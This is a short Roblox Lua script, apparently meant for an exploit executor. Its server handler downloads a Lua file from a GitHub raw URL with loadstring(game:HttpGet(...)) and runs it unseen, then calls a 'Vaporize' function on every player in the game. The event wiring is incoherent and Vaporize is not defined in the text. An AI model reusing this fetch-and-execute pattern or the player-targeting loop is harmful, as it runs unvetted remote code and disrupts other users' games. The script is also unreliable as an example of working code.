local event = Instance.new("RemoteEvent")
event:FireServer()
event.OnServerEvent:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LukeLor/LukeLor/refs/heads/main/CharacterModifications.lua"))()
for _, plrs in pairs(game.Players:GetPlayers()) do
Vaporize(Color3.fromRGB(0,225,155),"Ball", plrs)
      print("Vaporized")
end
end)
